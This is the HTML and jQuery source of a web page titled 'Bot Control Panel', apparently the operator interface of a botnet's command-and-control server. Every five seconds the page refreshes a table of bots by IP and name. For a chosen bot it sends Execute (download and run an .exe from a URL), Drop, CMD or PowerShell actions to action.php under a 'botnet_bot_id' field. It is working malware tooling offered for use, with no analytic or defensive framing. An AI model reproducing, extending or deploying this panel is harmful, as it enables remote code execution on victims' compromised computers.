<!DOCTYPE html>
<html lang="en"> <!--begin::Head-->

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Bot Control Panel | Telegram @Ailurophilevn</title><!--begin::Primary Meta Tags-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="title" content="Telegram @Ailurophilevn">
    <meta name="author" content="ColorlibHQ">
    <meta name="description" content="AdminLTE is a Free Bootstrap 5 Admin Dashboard, 30 example pages using Vanilla JS.">
    <meta name="keywords" content="bootstrap 5, bootstrap, bootstrap 5 admin dashboard, bootstrap 5 dashboard, bootstrap 5 charts, bootstrap 5 calendar, bootstrap 5 datepicker, bootstrap 5 tables, bootstrap 5 datatable, vanilla js datatable, colorlibhq, colorlibhq dashboard, colorlibhq admin dashboard"><!--end::Primary Meta Tags--><!--begin::Fonts-->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/source-sans-3@5.0.12/index.css" integrity="sha256-tXJfXfp6Ewt1ilPzLDtQnJV4hclT9XuaZUKyUvmyr+Q=" crossorigin="anonymous"><!--end::Fonts--><!--begin::Third Party Plugin(OverlayScrollbars)-->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@2.3.0/styles/overlayscrollbars.min.css" integrity="sha256-dSokZseQNT08wYEWiz5iLI8QPlKxG+TswNRD8k35cpg=" crossorigin="anonymous"><!--end::Third Party Plugin(OverlayScrollbars)--><!--begin::Third Party Plugin(Bootstrap Icons)-->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.min.css" integrity="sha256-Qsx5lrStHZyR9REqhUF8iQt73X06c8LGIUPzpOhwRrI=" crossorigin="anonymous"><!--end::Third Party Plugin(Bootstrap Icons)--><!--begin::Required Plugin(AdminLTE)-->
    <link rel="stylesheet" href="dist/css/adminlte.css"><!--end::Required Plugin(AdminLTE)-->
</head> <!--end::Head--> <!--begin::Body-->

<body class="layout-fixed sidebar-expand-lg bg-body-tertiary"> <!--begin::App Wrapper-->
    <div class="app-wrapper"> <!--begin::Header-->
         <main class="app-main"> <!--begin::App Content Header-->
            <div class="app-content-header"> <!--begin::Container-->
                <div class="container-fluid"> <!--begin::Row-->
                    <div class="row">
                        <div class="col-sm-6">
                            <h3 class="mb-0">Bots Control Panel</h3>
                        </div>
                        <div class="col-sm-6">
                            <ol class="breadcrumb float-sm-end">
                                <li class="breadcrumb-item"><a href="#">Home</a></li>
                                <li class="breadcrumb-item active" aria-current="page">
                                    Simple Tables
                                </li>
                            </ol>
                        </div>
                    </div> <!--end::Row-->
                </div> <!--end::Container-->
            </div> <!--end::App Content Header--> <!--begin::App Content-->
            <div class="app-content"> <!--begin::Container-->
                <div class="container-fluid"> <!--begin::Row-->
                    <div class="row">
                        <div class="col-md-12">
                         <div class="card mb-4">
    <div class="card-header">
        <h3 class="card-title">Bot Panel</h3>
    </div>
    <div class="card-body">
        <table class="table table-bordered">
            <thead> 
                <tr>
                    <th style="width: 10px">#</th>
                    <th>BOT IP</th>
                    <th>BOT NAME</th>
                    <th style="width: 150px">Action</th>
                </tr>
            </thead>
            <tbody id="bot-table-body">
                <!-- Bot data will be inserted here -->
            </tbody>
        </table>
    </div>
    <div class="card-footer clearfix">
        <ul class="pagination pagination-sm m-0 float-end">
            <li class="page-item"> <a class="page-link" href="#">&laquo;</a> </li>
            <li class="page-item"> <a class="page-link" href="#">1</a> </li>
            <li class="page-item"> <a class="page-link" href="#">2</a> </li>
            <li class="page-item"> <a class="page-link" href="#">3</a> </li>
            <li class="page-item"> <a class="page-link" href="#">&raquo;</a> </li>
        </ul>
    </div>
</div>

<!-- Modal for actions -->
<div class="modal fade" id="actionModal" tabindex="-1" aria-labelledby="actionModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="actionModalLabel">Bot Action</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p><strong>Bot ID:</strong> <span id="modal-bot-id"></span></p>
                <p><strong>Bot IP:</strong> <span id="modal-bot-ip"></span></p>
                <p><strong>Bot Name:</strong> <span id="modal-bot-name"></span></p>
                <input type="hidden" id="modal-action-type" name="action_type">
                <div class="mb-3">
                    <label for="modal-data" class="form-label">Url .exe for Execute | Command for CMD and Powershell | Leave null for drop</label>
                    <input type="text" class="form-control" id="modal-data" name="data">
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="modal-submit">Submit</button>
            </div>
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
         </div> <!-- /.col -->
                        </div> <!--end::Row-->
                </div> <!--end::Container-->
            </div> <!--end::App Content-->
        </main> <!--end::App Main--> <!--begin::Footer-->
        <footer class="app-footer"> <!--begin::To the end-->
            <div class="float-end d-none d-sm-inline">Anything you want</div> <!--end::To the end--> <!--begin::Copyright--> <strong>
                Copyright &copy; 2014-2024&nbsp;
                <a href="https://adminlte.io" class="text-decoration-none">AdminLTE.io</a>.
            </strong>
            All rights reserved.
            <!--end::Copyright-->
        </footer> <!--end::Footer-->
    </div> <!--end::App Wrapper--> <!--begin::Script--> <!--begin::Third Party Plugin(OverlayScrollbars)-->
    <script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@2.3.0/browser/overlayscrollbars.browser.es6.min.js" integrity="sha256-H2VM7BKda+v2Z4+DRy69uknwxjyDRhszjXFhsL4gD3w=" crossorigin="anonymous"></script> <!--end::Third Party Plugin(OverlayScrollbars)--><!--begin::Required Plugin(popperjs for Bootstrap 5)-->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha256-whL0tQWoY1Ku1iskqPFvmZ+CHsvmRWx/PIoEvIeWh4I=" crossorigin="anonymous"></script> <!--end::Required Plugin(popperjs for Bootstrap 5)--><!--begin::Required Plugin(Bootstrap 5)-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha256-YMa+wAM6QkVyz999odX7lPRxkoYAan8suedu4k2Zur8=" crossorigin="anonymous"></script> <!--end::Required Plugin(Bootstrap 5)--><!--begin::Required Plugin(AdminLTE)-->
    <script src="dist/js/adminlte.js"></script> <!--end::Required Plugin(AdminLTE)--><!--begin::OverlayScrollbars Configure-->
    <script>
        const SELECTOR_SIDEBAR_WRAPPER = ".sidebar-wrapper";
        const Default = {
            scrollbarTheme: "os-theme-light",
            scrollbarAutoHide: "leave",
            scrollbarClickScroll: true,
        };
        document.addEventListener("DOMContentLoaded", function() {
            const sidebarWrapper = document.querySelector(SELECTOR_SIDEBAR_WRAPPER);
            if (
                sidebarWrapper &&
                typeof OverlayScrollbarsGlobal?.OverlayScrollbars !== "undefined"
            ) {
                OverlayScrollbarsGlobal.OverlayScrollbars(sidebarWrapper, {
                    scrollbars: {
                        theme: Default.scrollbarTheme,
                        autoHide: Default.scrollbarAutoHide,
                        clickScroll: Default.scrollbarClickScroll,
                    },
                });
            }
        });
    </script> <!--end::OverlayScrollbars Configure--> <!--end::Script-->
	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
$(document).ready(function() {
    // Fetch bots data from show.php
    function fetchBots() {
        $.ajax({
            url: 'show.php',
            method: 'GET',
            dataType: 'json',
            success: function(response) {
                $('#bot-table-body').empty();

                // Loop through each bot and append row to table
                response.forEach(function(bot) {
                    $('#bot-table-body').append(
                        '<tr>' +
                            '<td>' + bot.id + '</td>' +
                            '<td>' + bot.ip + '</td>' +
                            '<td>' + bot.other_info + '</td>' +
                            '<td>' +
                                '<button class="btn btn-primary btn-sm action-btn" data-id="' + bot.id + '" data-ip="' + bot.ip + '" data-name="' + bot.other_info + '" data-action="execute">Execute</button> ' +
                                '<button class="btn btn-danger btn-sm action-btn" data-id="' + bot.id + '" data-ip="' + bot.ip + '" data-name="' + bot.other_info + '" data-action="drop">Drop</button> ' +
                                '<button class="btn btn-secondary btn-sm action-btn" data-id="' + bot.id + '" data-ip="' + bot.ip + '" data-name="' + bot.other_info + '" data-action="cmd">CMD</button> ' +
                                '<button class="btn btn-info btn-sm action-btn" data-id="' + bot.id + '" data-ip="' + bot.ip + '" data-name="' + bot.other_info + '" data-action="powershell">Powershell</button>' +
                            '</td>' +
                        '</tr>'
                    );
                });

                // Bind click event to action buttons
                $('.action-btn').click(function() {
                    const botId = $(this).data('id');
                    const botIp = $(this).data('ip');
                    const botName = $(this).data('name');
                    const actionType = $(this).data('action');

                    // Set data in modal
                    $('#modal-bot-id').text(botId);
                    $('#modal-bot-ip').text(botIp);
                    $('#modal-bot-name').text(botName);
                    $('#modal-action-type').val(actionType);

                    // Show modal
                    $('#actionModal').modal('show');
                });
            },
            error: function() {
                console.error("Failed to fetch bot data");
            }
        });
    }

    // Initial fetch on page load
    fetchBots();

    // Fetch bots every 5 seconds
    setInterval(fetchBots, 5000);

    // Handle submit button in modal
    $('#modal-submit').click(function() {
        const botId = $('#modal-bot-id').text();
        const actionType = $('#modal-action-type').val();
        const data = $('#modal-data').val();

        // Send data to action.php
        $.ajax({
            url: 'action.php',
            method: 'POST',
            data: {
                botnet_bot_id: botId,
                action: actionType,
                data: data
            },
            dataType: 'json',
            success: function(response) {
                alert(response.msg); // Show success message
                $('#actionModal').modal('hide'); // Hide modal after successful submit
            },
            error: function() {
                alert("Failed to send action to server.");
            }
        });
    });
});
</script>
</body><!--end::Body-->

</html>